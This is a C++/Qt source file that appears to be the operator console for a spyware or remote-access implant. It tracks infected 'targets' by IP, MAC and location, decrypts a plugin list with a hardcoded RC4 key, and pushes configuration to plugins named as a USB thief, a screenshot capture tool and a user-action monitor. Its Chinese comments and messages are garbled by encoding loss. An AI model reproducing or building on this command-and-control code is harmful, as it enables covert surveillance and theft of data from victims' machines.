	connect(ui.actAbout, SIGNAL(triggered()), this, SLOT(AboutAction()));
	connect(ui.actCleanDatabase, SIGNAL(triggered()), this, SLOT(CleanDatabaseAction()));
	connect(ui.actMigrateDaemon, SIGNAL(triggered()), this, SLOT(MigrateDaemonAction()));
	connect(ui.actQueryDaemonAddress, SIGNAL(triggered()), this, SLOT(QueryDaemonAddressAction()));

	// ˫���б��е�Ŀ��
	connect(ui.trTarget, SIGNAL(itemDoubleClicked(QTreeWidgetItem*, int)), this, SLOT(ShowTarget(QTreeWidgetItem*, int)));

	// �����б��е�Ŀ��
	connect(ui.trTarget, SIGNAL(itemClicked(QTreeWidgetItem*, int)), this, SLOT(CurrentTargetChanged(QTreeWidgetItem*, int)));

	// ��ʱ����������
	connect(&m_PNGTimer, SIGNAL(timeout()), this, SLOT(PNGTimerTimer()));

	// Ŀ���б��Ҽ��˵�
	connect(ui.trTarget, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(onTrTargetContextMenuActived(QPoint)));

	// ���鷽ʽ�ı�
	connect(ui.cmbCategory, SIGNAL(currentIndexChanged(int)), this, SLOT(onCmbCateGoryCurrentIndexChanged(int)));

	// ��ʾģʽ�ı�
	connect(ui.cmbDisplayMode, SIGNAL(currentIndexChanged(int)), this, SLOT(onCmbDisplayModeCurrentIndexChanged(int)));

	// ��������˸
	connect(m_trayFlashTimer, SIGNAL(timeout()), this, SLOT(FlashTrayIcon()));

	connect(m_tray, SIGNAL(activated(QSystemTrayIcon::ActivationReason)),
		this, SLOT(ProcessTrayEvent(QSystemTrayIcon::ActivationReason)));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��������״̬
//
void MainDlg::ChangeTargetStatus(QTreeWidgetItem* item, Target* target, bool online)
{
	item->setIcon(0, QIcon(QPixmap(GetIconPath(target))));
	m_targetDlgContainer->ChangeLabelIcon(target->dwTargetID, GetIconPath(target));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �����־���ļ�
//
void MainDlg::WriteLogToFile(LPCWSTR wzLogInfo)
{
	std::wstring logFile = GetExePath()+L"\\log.txt";
	
	HANDLE hFile = CreateFileW(
		logFile.c_str(),
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);
	
	SetFilePointer(hFile, 0, NULL, FILE_END);

	struct tm today = {0};
	time_t ltime;

	_time64(&ltime); 
	_localtime64_s(&today, &ltime);

	CHAR wzLog[1024] = {0};
	sprintf(wzLog, "------------------------------------------------------------------------------\r\n"
				   "%.4d-%.2d-%.2d %.2d:%.2d:%.2d\t\t%s\r\n"
				   "------------------------------------------------------------------------------\r\n",
		today.tm_year+1900, today.tm_mon+1, today.tm_mday,
		today.tm_hour, today.tm_min, today.tm_sec,
		WideToAnsi(wzLogInfo).c_str());

	DWORD dwWrite = 0;
	WriteFile(hFile, wzLog, strlen(wzLog), &dwWrite, NULL);

	CloseHandle(hFile);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �� update.dat �ж�ȡ�����Ϣ
//
bool MainDlg::ReadPluginInfo(PPLUGIN_CXT PlgCxtVect[])
{
	CHAR szDatPath[MAX_PATH] = {0};
	GetModuleFileNameA(0, szDatPath, MAX_PATH);
	LPSTR szName = strrchr(szDatPath, '\\');

	if ( MacPlgCxtVect == PlgCxtVect )
	{
		strcpy(szName, "\\components\\MACOSX\\update.dat");
	}
	else if ( IosPlgCxtVect == PlgCxtVect )
	{
		strcpy(szName, "\\components\\IOS\\update.dat");
	}
	else if ( WindowsPlgCxtVect == PlgCxtVect )
	{
		strcpy(szName, "\\components\\WINDOWS\\update.dat");
	}
	else if ( AndroidPlgCxtVect == PlgCxtVect )
	{
		strcpy(szName, "\\components\\ANDROID\\update.dat");
	}

	FILE *hFile = fopen(szDatPath,"rb");
	if (hFile == NULL)
	{
		//MessageBoxA(this->Handle, "�����ҵ���������ļ�!", "��ʾ", MB_OK | MB_ICONINFORMATION);
		return false;
	}

	char        rBuf[4096];
	char	    *pParam		= rBuf;
	char	    *pParamNext	= NULL;
	char	    *pDelim		= NULL;
	PPLUGIN_CXT	pluginCxt	;

	memset(rBuf, 0, 4096);
	int numRead = fread(rBuf, sizeof(char), 4096, hFile);
	if (numRead == 0 || !feof(hFile))
	{
		MessageBoxA(this->Handle, "��������ļ�����ȷ!", "��ʾ", MB_OK | MB_ICONINFORMATION);
		fclose(hFile);        
		return false;
	}    
	fclose(hFile);

	// rc4 encrypt target config content
	//
	BYTE  keyForRc4[8];
	keyForRc4[4] = '%';
	keyForRc4[5] = '+';
	keyForRc4[6] = 'w';
	keyForRc4[7] = 'f';
	keyForRc4[2] = ')';
	keyForRc4[0] = '#';
	keyForRc4[1] = '*';
	keyForRc4[3] = '(';

	RC4_KEY	   rc4Key;
	AdkBuildRc4Key(keyForRc4, 8, &rc4Key);
	AdkRc4Handler((BYTE *)rBuf, numRead, &rc4Key);

	do
	{
		pParamNext = strstr(pParam,"\r\n");
		if (!pParamNext)
		{
			break;
		}

		pParamNext[0] = '\0';

		// malloc a new pluginBlock to represent corresponding plugin dll
		//
		pluginCxt = (PPLUGIN_CXT)malloc(sizeof(PLUGIN_CXT));
		ZeroMemory(pluginCxt, sizeof(PLUGIN_CXT));

		// Plugin Format
		//
		//		PID|FILENAME|VER|LOADTYPE|INSTALLTYPE|PROC
		//	
		//	PROC
		//		*			---  all program
		//		explorer.exe;winlogon.exe;xxx;yyy;zzz;
		//
		do
		{
			pDelim  = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->dwPluginId = strtoul(pParam,NULL,10);

			pParam = pDelim + 1;
			pDelim = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->lpszPluginName = strdup(pParam);

			pParam = pDelim + 1;
			pDelim = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->dwPluginVer = atoi(pParam);

			pParam = pDelim + 1;
			pDelim = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->dwLoadType = atoi(pParam);

			pParam = pDelim + 1;
			pDelim = strchr(pParam,'|');
			if (!pDelim)
			{
				break;
			}
			pDelim[0] = '\0';
			pluginCxt->dwUpdateType = atoi(pParam);

			pParam = pDelim + 1;
			pluginCxt->lpszProcList = strdup(pParam);

		} while(false);

		if (!pDelim)
		{
			// Config file is corruptted
			//
			MessageBoxA(this->Handle, "��������ļ�����ȷ!", "��ʾ", MB_OK | MB_ICONINFORMATION);
			AdkFree(pluginCxt);
			return false;
		}
		else
		{
			PlgCxtVect[pluginCxt->dwPluginId] = pluginCxt;
			plgCount++;
		}

		// Read next plugin info 
		//
		pParam = pParamNext + 2;
		if (UINT(pParam - rBuf) >= numRead)
		{
			break;
		}

	} while(true);

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �������ļ�
//
bool MainDlg::ReadIniFile()
{
	ui.statusBar->showMessage(QString::fromLocal8Bit("��ȡ�����ļ�"));
	AddStatusInfo(STATUS_INFO, L"��ȡ�����ļ�");
	
	std::wstring iniFile = GetExePath() + L"\\setting.ini";
	
	if ( !AdkFileIsExistW(iniFile.c_str()) )
	{
		QMessageBox::critical(this, QString::fromLocal8Bit("��ʾ"), 
			QString::fromLocal8Bit("�����쳣����û�з��������ļ�!"));

		return false;
	}

	this->aniDaemonIpAddr = WideToAnsi(ReadStringPolicyFromLocal(L"Daemon", L"IpAddr", iniFile.c_str()));
	this->nPortForTarget = ReadValueFromLocal(L"Daemon", L"PortForTarget", iniFile.c_str());
	this->nCtrPortForControl = ReadValueFromLocal(L"Daemon", L"CtrPortForControl", iniFile.c_str());
	this->nDataPortForControl = ReadValueFromLocal(L"Daemon", L"DataPortForControl", iniFile.c_str());

	m_connDlg.SetIpAddress(QString::fromStdString(this->aniDaemonIpAddr));
	m_connDlg.SetTargetPort(QString("%1").arg(this->nDataPortForControl));
	m_connDlg.SetCtrlPort(QString("%1").arg(this->nCtrPortForControl));

	this->bAutoLogin = ReadValueFromLocal(L"Control", L"AutoLogin", iniFile.c_str());

	if ( this->bAutoLogin )
	{
		m_connDlg.SetAutoConn(true);

		std::string aniPassHash = WideToAnsi(ReadStringPolicyFromLocal(L"Control", L"PassHash", iniFile.c_str()));

		if (aniPassHash.length() == 0)
		{
			ui.statusBar->showMessage(QString::fromLocal8Bit("�����ļ������ָ�Ĭ�������ļ�"));
			AddStatusInfo(STATUS_INFO, L"�����ļ������ָ�Ĭ�������ļ�");
			this->bAutoLogin = false;
		}
		else
		{
			// ���з�Base64����
			//
			BYTE passMd5[32];
			AdkBase64Decode(aniPassHash.c_str(), aniPassHash.length(), passMd5, 32);

			CopyMemory(this->byPassMd5, passMd5, 16);
		}
	}

	this->aniLocalTarFileDir = WideToAnsi(ReadStringPolicyFromLocal(L"Control", L"LocalTargetPath", iniFile.c_str()));
	if ( this->aniLocalTarFileDir.length() == 0)
	{
		std::string path = WideToAnsi(GetExePath())+"\\Data";
		this->aniLocalTarFileDir = path.c_str();
	}

	//qDebug() << this->aniLocalTarFileDir.c_str();
	CreateDirectoryA(this->aniLocalTarFileDir.c_str(), NULL);

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private д�����ļ�
//
void MainDlg::WriteIniFile()
{
	ui.statusBar->showMessage(QString::fromLocal8Bit("���������ļ�"));
	AddStatusInfo(STATUS_INFO, L"���������ļ�");

	std::wstring iniFile = GetExePath() + L"\\setting.ini";

	WritePrivateProfileStringW(L"Daemon", L"IpAddr", AnsiToWide(this->aniDaemonIpAddr).c_str(), iniFile.c_str());
	WritePolicyToLocal(L"Daemon", L"PortForTarget", this->nDataPortForControl, iniFile.c_str());
	WritePolicyToLocal(L"Daemon", L"CtrPortForControl", this->nCtrPortForControl, iniFile.c_str());
	WritePolicyToLocal(L"Daemon", L"DataPortForControl", this->nDataPortForControl, iniFile.c_str());
	WritePolicyToLocal(L"Control", L"AutoLogin", this->bAutoLogin, iniFile.c_str());

	if ( this->bAutoLogin )
	{
		CHAR encode[MAX_PATH] = {0};
		AdkBase64Encode(this->byPassMd5, 16, encode, MAX_PATH);
		WritePrivateProfileStringW(L"Control", L"PassHash", AnsiToWide(encode).c_str(), iniFile.c_str());
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��������ת
//
void MainDlg::ConnectToDaemon()
{
	assert(this->ctrConn == NULL);

	char info[MAX_PATH] = {0};
	sprintf(info, "����������ת������ %s:%d ...", aniDaemonIpAddr.c_str(), nCtrPortForControl);

	ui.statusBar->showMessage(QString::fromLocal8Bit(info));
	AddStatusInfo(STATUS_INFO, info);

	bool bRet = ConnectToServer(this->aniDaemonIpAddr.c_str(),this->nCtrPortForControl, true);

	if (bRet == false)
	{
		SendMessage(this->Handle, WM_CONTROL_CONNFAILED, NULL, NULL);
	}

	m_waitDlg->Resize(this->size());
	m_waitDlg->show();
	ui.actStart->setEnabled(false);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ��Ŀ���б�
//
void MainDlg::InitialTargetData()
{
	ui.statusBar->showMessage(QString::fromLocal8Bit("��ѯĿ���б�"));
	AddStatusInfo(STATUS_INFO, L"��ѯĿ���б�");
	DM->QueryTargetList();

	ui.statusBar->showMessage(QString::fromLocal8Bit("ö��Ŀ������"));
	AddStatusInfo(STATUS_INFO, L"ö��Ŀ������");
	std::map<ULONG, Target *>::iterator i = g_targetMap.begin();
	for (; i != g_targetMap.end(); i++)
	{
		Target *tar = (*i).second;

		// ���Ŀ�걾��Ŀ¼
		//
		tar->CheckAndCreateDataDir();

		// ��ȡ�����̷��б�
		//
		DM->QueryTargetLogicDriver(tar->dwTargetID, tar->logicDriverSet);

		// ��ѯ����б�
		//
		DM->QueryTargetPluginList(tar->dwTargetID, tar->pluginVect);
	}

	// չ��Ŀ���б�
	for (int i = 0; i < ui.trTarget->topLevelItemCount(); i++)
	{
		QTreeWidgetItem* item = ui.trTarget->topLevelItem(i);
		item->setExpanded(true);
	}
}

 // ////////////////////////////////////////////////////////////////////////////////
 // @private ����
 //
void MainDlg::ControlOffline()
{
	this->ctrOnlineFlag = false;    
	this->ctrConn = NULL;

	ui.statusBar->showMessage(QString::fromLocal8Bit("�Ͽ�������������"));
	AddStatusInfo(STATUS_INFO, "�Ͽ�������������");

	std::map<ULONG, Target *>::iterator i = g_targetMap.begin();
	for (; i != g_targetMap.end(); i++)
	{
		Target *tarBlock = (*i).second;
		if (tarBlock == NULL)
		{
			continue;
		}

		if ( tarBlock->frmTarControl )
		{
			//tarBlock->frmTarControl->tarBlock = tarBlock;
			tarBlock->frmTarControl->TargetOffline();
		}

		if (tarBlock->tarConn)
		{
			tarBlock->bTarConnOnline = false;
			tarBlock->tarConn->CloseConnection();
			tarBlock->tarConn = NULL;
		}

		if (tarBlock->tarStatus == TARONLINE)
		{
			tarBlock->tarStatus = TAROFFLINE;

			tarBlock->treeNode->setText(2, QString::fromLocal8Bit("����"));

			ChangeTargetStatus(tarBlock->treeNode, tarBlock, false);
			UpdateTargetDisplay(tarBlock->treeNode);

			// �ı���ɫ
			for (int i = 0; i < 11; i++)
			{
				tarBlock->treeNode->setForeground(i, QBrush(QColor(0,0,0)));
			}
		}
	}

	// ֹͣ����������
	m_PNGTimer.stop();

	ui.actStart->setEnabled(true);
	ui.actStop->setEnabled(false);

	UpateTargetCount();
	//RefreshTargetList();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���Ŀ��ڵ�
//
void MainDlg::AddTargetNode(Target* tar)
{
	// ��ӽڵ�
	QTreeWidgetItem* targetItem = new QTreeWidgetItem;
	//targetItem->setIcon(0, QIcon(QPixmap("image/outline.png")));
	targetItem->setText(0, QString("%1").arg(tar->dwTargetID));
	targetItem->setText(1, QString::fromLocal8Bit(tar->aniTargetName.c_str()));
	targetItem->setText(2, QString::fromLocal8Bit("����"));
	targetItem->setText(3, QString::fromLocal8Bit(ConvertBuildNumberToStr(tar->dwOsBuildNumber).c_str()));
	targetItem->setText(4, tar->aniRemPublicIpAddr.c_str());
	targetItem->setText(5, tar->aniRemLocalIpAddr.c_str());

	// ���� IP ��ȡ���ڵ�
	std::string country, location;
	m_ipfinder.GetAddressByIp(tar->aniRemPublicIpAddr.c_str(), country, location);

	targetItem->setText(6, QString::fromLocal8Bit(country.c_str()));
	
	//srand(GetTickCount());

	// ��������
	WCHAR iniPath[MAX_PATH] = {0};
	wsprintfW(iniPath, L"%s\\Data\\%d\\flow_statistics.ini", GetExePath().c_str(), tar->dwTargetID);
	std::wstring iniFile = GetExePath() + L"\\flow_statistics.ini";
	unsigned int flowStatistics = ReadValueFromLocal(L"FlowStatistics", L"flow", iniPath);

	char text[256] = {0};
	sprintf(text, "%.2f MB", ( (double)flowStatistics ) / 1024 / 1024 );
	targetItem->setText(7, text);
	targetItem->setText(9, tar->aniRemMacAddr.c_str());

	tar->m_sysType = GetSystemType(tar->dwOsBuildNumber);

	ChangeTargetStatus(targetItem, tar, false);

	// ��չ��Ϣ
	if (tar->dwLangId != 0)
	{
		CHAR szLang[MAX_PATH];
		VerLanguageNameA(tar->dwLangId, szLang, MAX_PATH);
		if ( 0 != strcmp(szLang, "��������") )
		{
			targetItem->setText(10, QString::fromLocal8Bit(szLang));
		}
	}
	else
	{
		targetItem->setText(10, QString::fromLocal8Bit("δ֪"));
	}

	if ( tar->m_netEnv > 4 )
		tar->m_netEnv = 4;

	targetItem->setText(8, QString::fromStdWString(std::wstring(TargetDlg::Net_description[tar->m_netEnv])));
	targetItem->setTextAlignment(8, Qt::AlignCenter);

	// �洢 target ָ��
	targetItem->setData(0, Qt::UserRole, (unsigned int)tar);

	// �� tar �б���һ�� item ָ��
	tar->treeNode = targetItem;

	if ( tar->m_favorite )
		targetItem->setIcon(11, QIcon(QPixmap("image/star.png")));

	m_itemList.push_back(targetItem);

	AddTargetNode(targetItem);

	UpateTargetCount();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����־�����������Ϣ
//
void MainDlg::AddStatusInfo(STATUS_LEVEL sl, const wchar_t* lpwzInfo)
{
	//ui.tbLog->setRowCount(ui.tbLog->rowCount()+1);

	//char* pixmap[] = {
	//	"image/info.png", 
	//	"image/info.png",
	//	"image/error.png",
	//	"image/error.png"};

	//QString icoPath = QString(pixmap[sl]);
	//QIcon icon(icoPath);

	//int row = ui.tbLog->rowCount()-1;
	//ui.tbLog->setItem(row, 0, new QTableWidgetItem(
	//	icon, QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss")));
	//ui.tbLog->setItem(row, 1, new QTableWidgetItem(QString::fromStdWString(std::wstring(lpwzInfo))));

	//ui.tbLog->scrollToBottom();

	//WriteLogToFile(lpwzInfo);
	
	ui.edtLog->append(QString("[") + QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss") + "] " + QString::fromStdWString(std::wstring(lpwzInfo)));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 
//
void MainDlg::AddStatusInfo(STATUS_LEVEL sl, const char* lpszInfo)
{
	AddStatusInfo(sl, AnsiToWide(std::string(lpszInfo)).c_str());
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ��������˸
//
void MainDlg::FlashTrayIcon()
{
	if ( m_iconToggle )
	{
		m_tray->setIcon(QApplication::windowIcon());
	}
	else
	{
		m_tray->setIcon(QIcon());
	}

	m_iconToggle = !m_iconToggle;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ��������Ӧ
//
void MainDlg::ProcessTrayEvent(QSystemTrayIcon::ActivationReason reason)
{
	if ( QSystemTrayIcon::Trigger == reason )
	{
		m_trayFlashTimer->stop();
		m_tray->setIcon(QApplication::windowIcon());
		this->showNormal();
		this->activateWindow();
	}
}

void MainDlg::ActiveMainWindow()
{
	m_targetDlgContainer->hide();
	this->showNormal();
	this->activateWindow();
}

void MainDlg::UpdateTargetDisplay( QTreeWidgetItem* item )
{
	//if ( !ItemCanShow(item) )
	//{
	//	QTreeWidgetItem* parent = item->parent();
	//	if ( parent )
	//	{
	//		parent->takeChild(parent->indexOfChild(item));

	//		if ( 0 == parent->childCount() )
	//			ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(parent));
	//	}
	//}
	//else
	//{
	//	QTreeWidgetItem* parent = item->parent();
	//	if ( !parent )
	//		AddTargetNode(item);
	//}
}

void MainDlg::ModifyPluginPolicy( unsigned int pTarget, int pluginNumber )
{
	if ( !this->ctrOnlineFlag )
	{
		QMessageBox::critical(
			0,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("ֻ��������ת�����������ܽ��в����������!"));
		return;
	}

	Target* tarBlock = (Target*)pTarget;

	PolicyDlg dlg(0, tarBlock, pluginNumber);

	if ( QDialog::Accepted == dlg.exec() )
	{

		PUSER_ACT_CFG lpUserActCfgData = NULL;
		PUSB_THIEF_CONFIG lpUsbThiefCfgData = NULL;
		PCAPTURE_CONFIG lpCaptureCfgData = NULL;

		if ( !dlg.GetUserActionCfgInfo(lpUserActCfgData) 
			|| !dlg.GetUsbCfgInfo(lpUsbThiefCfgData)
			|| !dlg.GetScreenshotCfgInfo(lpCaptureCfgData) )
		{
			MsgBoxInfoExW(Handle, L"�����������ʧ��!");
			SetStatusInfoW(STATUS_ERROR, L"�����������ʧ��!");
			return;
		}


		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
			2,
			(PBYTE)lpUserActCfgData,
			lpUserActCfgData->dwSize);
		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
			3,
			(PBYTE)lpUsbThiefCfgData,
			lpUsbThiefCfgData->dwSize);

		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
			4,
			(PBYTE)lpCaptureCfgData,
			lpCaptureCfgData->dwSize);

		FrmMain->ctrConn->Send_PLI(tarBlock->dwTargetID);         // ���»�ȡĿ������Ϣ


		if ( lpUserActCfgData )
		{
			AdkFree(lpUserActCfgData);
		}

		if ( lpUsbThiefCfgData )
		{
			AdkFree(lpUsbThiefCfgData);
		}

		if ( lpCaptureCfgData )
		{
			AdkFree(lpCaptureCfgData);
		}

		MsgBoxInfoExW(NULL, L"����������óɹ�!");
		SetStatusInfoW(STATUS_INFO, L"����������óɹ�!");

		if ( tarBlock->frmTarControl )
		{
			tarBlock->frmTarControl->UpdateCapturePolicy();
			tarBlock->frmTarControl->activateWindow();
		}
	}
}
